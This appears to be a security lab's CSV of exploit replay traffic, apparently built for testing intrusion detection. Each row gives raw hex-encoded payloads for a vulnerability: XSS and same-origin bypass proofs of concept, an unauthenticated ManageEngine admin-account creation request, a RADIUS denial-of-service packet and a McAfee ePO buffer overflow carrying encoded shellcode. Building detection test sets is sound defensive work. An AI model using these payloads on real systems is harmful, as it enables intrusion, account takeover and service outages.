XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
TSL20130912-09_HP_ProCurve_Manager_SNAC_GetDomainControllerServlet_Policy_Bypass.xml,HP ProCurve Manager SNAC GetDomainControllerServlet Policy Bypass,A policy bypass vulnerability exists in HP ProCurve Manager SNAC. The vulnerability is due to a design weakness in the GetDomainControllerServlet class. A remote attacker could exploit the vulnerability by sending specially crafted data to a vulnerable version of the software. Successful exploitation could result in authentication bypass.,HTTPS,TCP,"HTTP/1.1 200 OK||0D 0A ||Server||3A || Apache-Coyote/1.1||0D 0A ||X-Powered-By||3A || Servlet 2.4||3B || JBoss-4.2.2.GA (build||3A || SVNTag=JBoss_4_2_2_GA date=200710221139)/Tomcat-5.5||0D 0A ||Content-Type||3A || application/xml||3B ||charset=ISO-8859-1||0D 0A ||Content-Length||3A || 595||0D 0A ||Date||3A || Fri, 27 Sep 2013 16||3A ||10||3A ||55 GMT||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||UTF-8||22 || standalone=||22 ||yes||22 ||?>||0A ||<Controllers>||0A ||    <Domain>||0A ||        <domainName>TSLVRT.COM</domainName>||0A ||        <domainControllerIP>172.16.8.29</domainControllerIP>||0A ||        <domainAlias>TSLVRT</domainAlias>||0A ||        <connType>LDAP</connType>||0A ||        <port>389</port>||0A ||        <caCertState></caCertState>||0A ||        <searchFilterField></searchFilterField>||0A ||        <searchBase></searchBase>||0A ||        <isAnonymous>false</isAnonymous>||0A ||        <logonType>account</logonType>||0A ||        <userName>Administrator</userName>||0A ||        <password>foobar</password>||0A ||    </Domain>||0A ||</Controllers>||0A||"
﻿TSL20140123-02_Google_Chrome_XSSAuditor_Filter_Security_Policy_Bypass.xml,Google Chrome XSSAuditor Filter Security Policy Bypass,"A policy bypass vulnerability exists in Google Chrome. The vulnerability is due a design weakness in Chrome XSSAuditor. By inserting JavaScript in the srcdoc attribute of an IFRAME tag, the Cross-Site Scripting filter can be bypassed. An attacker can exploit this weakness to further facilitate exploiting known cross-site vulnerabilities.","HTTP,HTTPS",TCP,"GET /~jxia/poc.php HTTP/1.1||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || keep-alive||0D 0A ||Accept||3A || text/html,application/xhtml+xml,application/xml||3B ||q=0.9,*/*||3B ||q=0.8||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36||0D 0A ||Accept-Encoding||3A || gzip,deflate,sdch||0D 0A ||Accept-Language||3A || en-US,en||3B ||q=0.8||0D 0A 0D 0A||"
TSL20140123-02_Google_Chrome_XSSAuditor_Filter_Security_Policy_Bypass.xml,Google Chrome XSSAuditor Filter Security Policy Bypass,"A policy bypass vulnerability exists in Google Chrome. The vulnerability is due a design weakness in Chrome XSSAuditor. By inserting JavaScript in the srcdoc attribute of an IFRAME tag, the Cross-Site Scripting filter can be bypassed. An attacker can exploit this weakness to further facilitate exploiting known cross-site vulnerabilities.","HTTP,HTTPS",TCP,"POST /~jxia/poc.php HTTP/1.1||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || keep-alive||0D 0A ||Content-Length||3A || 73||0D 0A ||Cache-Control||3A || max-age=0||0D 0A ||Accept||3A || text/html,application/xhtml+xml,application/xml||3B ||q=0.9,*/*||3B ||q=0.8||0D 0A ||Origin||3A || http||3A ||//172.16.1.2||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36||0D 0A ||Content-Type||3A || application/x-www-form-urlencoded||0D 0A ||Referer||3A || http||3A ||//172.16.1.2/~jxia/poc.php||0D 0A ||Accept-Encoding||3A || gzip,deflate,sdch||0D 0A ||Accept-Language||3A || en-US,en||3B ||q=0.8||0D 0A 0D 0A ||iframe=%22srcdoc%3D%22%3Cscript%3Ealert%28%27TSL+VRT%27%29%3C%2Fscript%3E"
TSL20140123-02_Google_Chrome_XSSAuditor_Filter_Security_Policy_Bypass.xml,Google Chrome XSSAuditor Filter Security Policy Bypass,"A policy bypass vulnerability exists in Google Chrome. The vulnerability is due a design weakness in Chrome XSSAuditor. By inserting JavaScript in the srcdoc attribute of an IFRAME tag, the Cross-Site Scripting filter can be bypassed. An attacker can exploit this weakness to further facilitate exploiting known cross-site vulnerabilities.","HTTP,HTTPS",TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Mon, 03 Feb 2014 16||3A ||15||3A ||55 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.4 Perl/v5.8.8||0D 0A ||X-Powered-By||3A || PHP/5.1.6||0D 0A ||Content-Length||3A || 314||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0A ||<head>||0A ||<title>PoC for TSL20140123-02</title>||0A ||</head>||0A ||<body>||0A ||<form action=||22 ||poc.php||22 || method=||22 ||POST||22 ||>URL||3A || <input type=||22 ||text||22 || value=||22 ||&quot||3B ||srcdoc=&quot||3B ||&lt||3B ||script&gt||3B ||alert(&apos||3B ||TSL VRT&apos||3B ||)&lt||3B ||/script&gt||3B 22 || name=||22 ||iframe||22 || /><br/><input type=||22 ||submit||22 ||/><br/></form>Click the button to demo the XSS</body>||0A ||</html>||0A||"
TSL20140123-02_Google_Chrome_XSSAuditor_Filter_Security_Policy_Bypass.xml,Google Chrome XSSAuditor Filter Security Policy Bypass,"A policy bypass vulnerability exists in Google Chrome. The vulnerability is due a design weakness in Chrome XSSAuditor. By inserting JavaScript in the srcdoc attribute of an IFRAME tag, the Cross-Site Scripting filter can be bypassed. An attacker can exploit this weakness to further facilitate exploiting known cross-site vulnerabilities.","HTTP,HTTPS",TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Mon, 03 Feb 2014 16||3A ||16||3A ||01 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.4 Perl/v5.8.8||0D 0A ||X-Powered-By||3A || PHP/5.1.6||0D 0A ||Content-Length||3A || 150||0D 0A ||Keep-Alive||3A || timeout=15, max=99||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0A ||<head>||0A ||<title>PoC for TSL20140123-02</title>||0A ||</head>||0A ||<body>||0A ||<iframe name=||22 22 ||srcdoc=||22 ||<script>alert('TSL VRT')</script>||22 ||></iframe></body>||0A ||</html>||0A||"
﻿TSL20140919-05_Google_Android_Browser_Same_Origin_Policy_Bypass.xml,Google Android Browser Same Origin Policy Bypass,A policy bypass vulnerability exists in Google Android Browser. The vulnerability is due to a flaw leading to same origin policy bypass. A remote unauthenticated attacker can exploit this vulnerability by enticing a user to open a web page. Successful exploitation can result in disclosure of information about other web pages opened by the user or stored in the browser cache.,HTTP/HTTPS,TCP,"GET /~aakuney/Sept19-android/poc.html HTTP/1.1||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || keep-alive||0D 0A ||Accept||3A || text/html,application/xhtml+xml,application/xml||3B ||q=0.9,*/*||3B ||q=0.8||0D 0A ||X-Requested-With||3A || com.android.browser||0D 0A ||User-Agent||3A || Mozilla/5.0 (Linux||3B || U||3B || Android 4.3||3B || en-us||3B || sdk Build/JB_MR2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Language||3A || en-US||0D 0A ||Accept-Charset||3A || utf-8, iso-8859-1, utf-16, *||3B ||q=0.7||0D 0A 0D 0A||"
TSL20140919-05_Google_Android_Browser_Same_Origin_Policy_Bypass.xml,Google Android Browser Same Origin Policy Bypass,A policy bypass vulnerability exists in Google Android Browser. The vulnerability is due to a flaw leading to same origin policy bypass. A remote unauthenticated attacker can exploit this vulnerability by enticing a user to open a web page. Successful exploitation can result in disclosure of information about other web pages opened by the user or stored in the browser cache.,HTTP/HTTPS,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 23 Sep 2014 17||3A ||56||3A ||08 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.4 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Tue, 23 Sep 2014 17||3A ||55||3A ||38 GMT||0D 0A ||ETag||3A || ||22 ||4540053-24c-503bf4661ba80||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 588||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0D 0A ||<script>||0D 0A ||function addFrame() ||0D 0A ||{||0D 0A 09 ||var f = document.createElement('iframe')||3B 0D 0A 09 ||f.setAttribute('name', 'bingo')||3B 0D 0A 09 ||f.setAttribute('src', path.value + 'steal.html')||3B 0D 0A 09 ||f.onload = function(){boom()||3B ||}||3B 0D 0A 09 ||document.body.appendChild(f)||3B 0D 0A ||}||0D 0A 09 09 0D 0A ||function boom()||0D 0A ||{||0D 0A 09 ||window.open('\u0000javascript||3A ||alert(document.cookie)','bingo')||3B 0D 0A ||}||0D 0A ||</script>||0D 0A ||<body||22 ||>||0D 0A ||<p>TELUS Security Labs</p>||0D 0A ||<p>Change path to <b>steal.html</b>||3A 0D 0A ||<input id=||22 ||path||22 || type=||22 ||text||22 || value=||22 ||http||3A ||//172.16.1.2/~aakuney/Sept19-android/||22 || size=||22 ||60||22 ||/>||0D 0A ||<input type=||22 ||button||22 || value=||22 ||RUN||22 || onclick=||22 ||addFrame()||22 ||/>||0D 0A ||</body>||0D 0A ||</html>"
﻿TSL20141231-02_ManageEngine_Desktop_Central_Dcpluginservelet_Policy_Bypass.xml,ManageEngine Desktop Central Dcpluginservelet Policy Bypass,"A policy bypass vulnerability exists in ManageEngine Desktop Central. The vulnerability is due to lack of authentication and insufficient input validation of the parameters sent to the Dcpluginservelet page when processing HTTP(S) requests. A remote unauthenticated attacker can exploit this vulnerability by sending an specially crafted request to the target server. In a successful attack scenario, the attacker can create an administrator account. Tester should set variable $destPort to 8020 or 8383 before test.",HTTP/HTTPS,TCP,POST /servlets/DCPluginServelet?action=addPlugInUser&role=DCAdmin&userName=telus&email=telus%40tslvrt.com&phNumber=12345678&password=UhQ9Gdh4vj25aW09lLiW6w%3d%3d&salt=11111111&createdtime=1420474976 HTTP/1.1||0D 0A ||Host||3A || dhcp167||3A ||8020||0D 0A 0D 0A||
TSL20141231-02_ManageEngine_Desktop_Central_Dcpluginservelet_Policy_Bypass.xml,ManageEngine Desktop Central Dcpluginservelet Policy Bypass,"A policy bypass vulnerability exists in ManageEngine Desktop Central. The vulnerability is due to lack of authentication and insufficient input validation of the parameters sent to the Dcpluginservelet page when processing HTTP(S) requests. A remote unauthenticated attacker can exploit this vulnerability by sending an specially crafted request to the target server. In a successful attack scenario, the attacker can create an administrator account. Tester should set variable $destPort to 8020 or 8383 before test.",HTTP/HTTPS,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 06 Jan 2015 15||3A ||48||3A ||33 GMT||0D 0A ||Server||3A || Apache/2.4.9 (Win32) OpenSSL/1.0.1g mod_jk/1.2.37||0D 0A ||X-dc-header||3A || yes||0D 0A ||Content-Length||3A || 170||0D 0A ||Content-Type||3A || text/xml||3B ||charset=UTF-8||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||ISO-8859-1||22 ||?>||0D 0A ||<DCUserStatus>||0D 0A ||<DCStatus errorcode=||22 ||-1||22 || message=||22 ||Sucessfully added||22 || module=||22 22 || status=||22 ||sucess||22 || userID=||22 22 ||/>||0D 0A ||</DCUserStatus>||0D 0A||"
﻿TSL20150113-11_Microsoft_Network_Policy_Server_RADIUS_Denial_of_Service.xml,Microsoft Network Policy Server RADIUS Denial of Service,"A denial of service vulnerability has been reported in Microsoft Network Policy Server. The vulnerability is due to an error in processing certain specially crafted username strings. A remote, unauthenticated attacker could exploit this vulnerability by sending specially crafted requests to the Network Policy Server. Successful exploitation could lead to a denial of service condition on the server. Tester should set $destPort to 1812 before test.",RADIUS,UDP,||01 ||-||00 ||$||1C ||z||FA ||i||C9 B4 ||7||09 99 D1 15 AE ||]||89 9B 8B 01 10 ||testu*(*()))))
﻿mcafee_epolicy_source.xml,McAfee EPolicy Orchestrator Buffer Overflow,This threat causes a buffer overflow in the McAfee EPolicy Orchestrator product by sending an overly long source header.  McAfee EPolicy Orchestrator typically listens on port 81.,HTTP,TCP,"GET /spipe/pkg HTTP/1.0||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || SPIPE/1.0||0D 0A ||Content-Length||3A || 1584||0D 0A ||AgentGuid=nXZWPA1ncAdFn8yGTrE8KLryXpAo92HUrUeUtyX70fPvxk2F8BPYOmJMHNb0cTnI||0D 0A ||Source=ZfEbNVZm89c6W05Zv5On0Nyh8bd6QFo6ZeQ4Vw7GvmgK2kwf8B4QDZAeAzZu3eEEzWaTPPVlkXhhYt3QBzNn3C89lnqe||EB 1A ||Le||DA DB 1E ||`KDedD8qGAwFmu9p8iKc||FF ||f||81 CA FF 0F ||BRj||02 ||X||CD ||.<||05 ||Zt||EF B8 ||0sBu||8B FA AF ||u||EA AF ||u||E7 FF E7 ||ZLtTcuTehNl0iKFNxdoHs8i6h13Bt33Ehz3YdOZDPCwl5iDUZX2R7f14FQoPzUNNeBGTQ3kYyuxXZX4tY1KROMg4xvH9uVIkAQQWTfYIVLq4||0D 0A 0D 0A ||aZATfTUSzSm35rRNXzQyx9jGRPwG0ZS3bePIuC9yS514BZwAgXRlWOvxrYKNeMopyWwyAdmbWvHg0JMF4JdOQSZs5bIdDdBhwe16EF0OT1muZWlSGxhaMcq5fYIalQUemEr0Me4rzD2HntWRJmABanbalrFriX9P6D0PTpWXLqTROYFvghTgptJ0eXEpGPUpsQt2JgwqqZ0tGQTgzgb5TSIzmnPPcDDTlFDmE1ACCvuFCRMdRnlPQHcu2ha1dCBS3PPlwngTAychB1FcwkRUQNUSR1ldNPECnE0rnuTg0nlzkDKKvBZPuiFL0JSl1QHdg49I4Cy3M3EW28sqwC1FKaow9EyrhfTKBGtZm20sBu0sBu||92 F9 9F 9F FC 91 ||NK/O||F5 ||BA?||FC ||J||F8 ||'||93 91 ||O||F9 9F F8 9B ||O||98 99 9B D6 ||FC||96 ||?||97 ||B||91 D6 90 91 ||@NH||97 ||77'||93 99 99 97 ||A||91 ||7O'||F8 90 91 ||FC||FC ||KAN'@||90 D6 ||7J'||93 90 93 F5 FD ||G||D6 ||O@?||91 ||H?K||F5 99 ||B||90 92 90 98 ||B||96 FC ||F||F8 ||?||93 D6 92 ||JNAF||9B 91 9F 98 D6 ||I||F8 98 ||K/C||96 96 ||'||90 ||?||FC 90 ||/@||F8 91 ||N@'O||90 ||'||D6 93 ||7||F8 98 ||7J||99 92 ||F7||98 90 9B ||A||F5 ||CC@K/FJ||96 92 ||I||FD 98 ||O7||91 FC 99 97 ||O7GI||D6 ||'7||FC F8 F8 96 ||AKG||92 FD ||BCA7||FC 96 D6 ||C||99 FC 9B F8 FD F8 91 90 FC ||'||97 ||7@||97 ||J||99 92 ||F||9B ||G||97 ||7||9F 96 91 ||/G||9B ||A||92 ||A'||98 FD ||FN||F9 ||J||9F 96 90 97 ||?G||F9 ||J@A||F5 F9 ||7B||90 ||?||FD 98 ||OB||98 99 ||A||9F ||'||FC 93 ||H||D6 97 ||'||FC F8 ||'H||FC ||@||93 92 93 ||J||96 D6 99 99 ||B||FC ||HK//B||9F 90 ||A7||F9 ||@||D6 D6 ||F||92 98 ||B||D6 99 ||NNI||93 ||OH/||97 99 ||IJ?N||F9 ||N@7||9F 9B FC 92 ||FH||91 ||K||96 ||BO||92 ||NJG||92 ||?K||91 ||FF||F5 ||G||90 ||G7||91 FC ||N@7||FC 90 9F 98 91 ||AN||F9 91 ||I||97 9F 96 ||?||99 ||H||97 ||B7||92 93 ||/'||93 ||OC||FC ||K||93 ||7/||96 ||BNC||9F 99 ||7AFNN||99 F8 ||'OG||FD 92 ||JFBBJ||F8 ||H||91 9B ||HC/H||96 ||I||92 92 ||N||92 F9 92 ||@||D6 ||BG||F5 ||N'||99 D6 F8 9B ||KJ||90 D6 ||'||98 91 90 93 ||OO||9B ||N7HA||FC 99 ||FJO/HG||97 ||?G||97 F5 ||/JN||9B 9B 93 ||BF||F8 F8 ||NF/||D6 ||GO?||9B ||/C||96 FD ||AB||92 ||A||FC ||KA||D6 ||?H||F9 ||BO||99 FD D6 ||B||D6 91 FC ||CK||9B ||JJB||FD F9 D6 ||BCBFO||F5 9F 99 FD ||GFO||96 96 ||A||FC ||@||D6 ||N||90 ||FKBB/||92 D6 ||7||D6 90 D6 92 ||G||FD 92 ||C/C||92 9F 98 ||C||90 91 FD 97 97 ||7||D6 99 ||7||93 99 ||7FHG||99 99 ||CGA||F5 ||CG||FC 96 ||C||90 F5 FD 93 ||F||98 9F ||A/||97 ||'||97 ||B||F9 ||K||92 97 98 ||G||91 ||?KF||9B ||KG?||FD ||CA||90 ||NHO||98 ||O||90 93 ||@||D6 F9 ||/A||F9 ||7||96 ||C/||FD F9 ||K/||92 90 F8 ||H||93 ||G||FD ||H?||9F ||O||91 ||A||96 F8 ||G||FC 99 93 F5 ||O||F5 F9 FC ||O||FC ||?AA||91 ||G||99 ||N||D6 ||C||99 ||7||99 9F ||FJAB||F8 FC 9F ||B||F8 ||HACN||91 91 9B ||C?jPY||D9 EE D9 ||t$||F4 ||[||81 ||s||13 B2 1B ||G||EF 83 EB FC E2 F4 ||Nq||AC A2 ||Z||E2 B8 10 ||M{||CC 83 96 ||?||CC AA 8E 90 3B EA CA 1A A8 ||d||FD 03 CC B0 92 1A AC A6 ||9/||CC EE ||\*||87 ||v||1E 9F 87 9B B5 DA 8D E2 B3 D9 AC 1B 89 ||Oc||C7 C7 FE CC B0 96 1A AC 89 ||9||17 0C ||d||ED 07 ||F||04 B1 ||7||CC ||f||DE ||?[||8E ||q*||9C 8B ||9Xwd||F2 17 CC 9F AE B6 CC AF BA ||E/a||FC 15 AB BF ||M||CD ||!||BC D4 ||st||DD DA ||l4||DD ED ||O||B8 ||?||DA D0 AA 13 89 ||K||B8 ||9||ED 92 A2 89 ||3||F6 ||O||ED E7 ||qE||10 ||bs||9E E6 ||G||B6 10 10 ||dH||14 BC E1 ||H||04 BC F1 ||H||B8 ||?||D4 ||sV||B3 D4 ||H||CE 0E ||'s||E3 F5 C2 DC 10 10 ||dqW||BE E7 E4 97 87 16 B6 ||i||06 E5 E4 91 BC E7 E4 97 87 ||WR||C1 A6 E5 E4 91 BF E6 ||O||12 10 ||b||88 ||/||08 CB DD ||>||B8 ||M||CD 12 10 ||b}-||8B D4 ||s$||82 3B FE ||-||BF EB ||2||8B ||fUq||03 ||fP*||87 1C 18 E5 05 C2 ||LYk||7C ||?aD||19 B0 ||/||9D ||L||A8 ||Q||10 C7 ||_||B8 ||9||E9 ||L||15 BE E3 ||J-||EE E3 ||J||12 BE ||M||CB ||/Bk||1E 89 BC ||M||CD ||-||10 ||M,||B8 ||?9L||BB ||lv||B8 ||9||E0 E4 97 87 ||]||D5 A7 8F E1 E4 91 10 ||b||1B ||G||EF ||9oHV36DsSotIS9Vt6BrSQhajzI6cWXylfzNpShb80i0YY6sOtTYtabVBsXTQgtA55GprDHNeUjVbTHAoNUWrUpL3dfTWmgqMwxz0ne4fGITXBRklVg7JyxuS3bbSY0Kq8KDJonkpSEkFw4SNzEp1CZAfE07di0Nrns55BGeA0XyOunZ4BSq3Zz2Hb9qUASy27Q"
mcafee_epolicy_source.xml,McAfee EPolicy Orchestrator Buffer Overflow,This threat causes a buffer overflow in the McAfee EPolicy Orchestrator product by sending an overly long source header.  McAfee EPolicy Orchestrator typically listens on port 81.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
